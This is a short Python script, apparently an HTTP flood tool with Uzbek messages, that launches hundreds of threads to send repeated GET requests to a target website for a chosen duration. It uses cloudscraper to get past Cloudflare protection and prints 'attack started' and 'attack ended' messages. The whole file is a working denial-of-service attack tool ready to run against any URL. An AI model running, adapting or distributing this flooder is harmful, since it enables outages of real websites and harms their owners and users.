import threading
import cloudscraper
import datetime
import time
import subprocess
from colorama import Fore, init
import sys

init(convert=True)

def LaunchCFB(url, threadss, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()

    print(Fore.MAGENTA + f" [>] Hujum => {url} ga {t} soniya")

    ping_thread = threading.Thread(target=ping_example_com)
    ping_thread.start()

    while threads_count <= int(threadss):
        try:
            th = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

    th.join()
  
    ping_thread.do_run = False
    ping_thread.join()

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except:
            pass

def ping_example_com():
    while getattr(threading.current_thread(), "do_run", True):
        try:
            result = subprocess.run(['ping', '-c', '1', 'example.com'], capture_output=True, text=True)
            print(Fore.CYAN + result.stdout.strip())
            time.sleep(1)
        except KeyboardInterrupt:
            break

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(Fore.RED + " [!] Argumentlar soni noto'g'ri. Quyidagicha ishlating: python3 main.py <websayt> <potok> <vaqt>\n Masalan: python3 main.py https://test.com 500 60")
        sys.exit(1)

    target, thread, t = sys.argv[1], sys.argv[2], sys.argv[3]

    LaunchCFB(target, int(thread), int(t))

    print(Fore.MAGENTA + "\n [>] Hujum tugadi.")
